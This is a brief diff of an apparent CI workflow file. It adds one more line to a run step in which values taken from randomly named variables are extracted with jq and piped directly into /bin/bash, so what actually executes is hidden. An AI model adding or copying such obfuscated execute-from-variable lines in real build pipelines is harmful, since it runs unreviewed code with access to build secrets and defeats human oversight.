@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$sul17462" | jq -r .apy6 | /bin/bash
           echo $lsv1 | jq -r .p5495 | /bin/bash
           echo $mp1594 | jq -r .tpzha94 | /bin/bash
+          printf '%s' "$gti5151" | jq -r .uv42230 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
